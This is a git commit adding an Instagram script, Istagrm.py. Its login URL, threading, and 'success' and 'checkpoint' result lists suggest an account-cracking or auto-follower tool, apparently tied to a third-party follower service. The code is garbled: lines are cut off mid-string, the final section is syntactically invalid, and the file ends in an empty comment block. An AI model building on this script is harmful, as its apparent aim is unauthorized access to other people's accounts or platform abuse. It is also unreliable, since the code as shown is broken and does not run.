c19d653b4ac08965fc2d27c88f0ffeb27d0d2913
Nikyi <102758252+Zuck49@users.noreply.github.com>
2022-04-24 04:49:08 +0700

    Add files via upload

---
+++ Istagrm.py
@@ -0,0 +1,74 @@
+ try:
+        import os
+        import re
+        import sys
+        import time
+        import json
+        import uuid
+        import hmac
+        import random
+        import hashlib
+        import urllib
+        import requests
+        import stdiomask
+        import urllib.request
+except ImportError as e:
+        exit(f'\n [\033[1;35m>\033[0m] module {e} belum te>
+
+from time import sleep
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+from bs4 import BeautifulSoup as parser
+
+day=datetime.now().strftime("%d-%b-%Y")
+nyMnD = 5
+nyMxD = 10
+
+insta_log='https://www.instagram.com/accounts/login/?force>
+url='https://www.instagram.com'
+
+try:
+        os.mkdir('result')
+except:
+        pass
+
+H='\033[1;32m' #HIJAU
+M='\033[1;31m' #MERAH
+K='\033[1;33m' #HIJAU
+U='\033[1;35m' #UNGU
+O='\033[38;2;255;127;0;1m' #ORANGE
+C='\033[0m' #CLEAR
+
+USN="Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.1>
+
+internal=[]
+external=[]
+success=[]
+checkpoint=[]
+loop=0
+following=[]
+s=requests.Session()
+
+
+try:
+    # python 2
+        urllib_quote_plus = urllib.quote
+except:
+    # python 3
+        urllib_quote_plus = urllib.parse.quote_plus
+
+def cekAPI(cookie):
+        user=open('.username','r').read()
+        try:
+                c=requests.get("https://www.instagram.com/>
+                
+                try:
+
+c=requests.get follow("https://topfollow.app/>
+
+try: auto_followers('.username'.'r').read ()
+#########################################
+
+# D
+
+#########################################
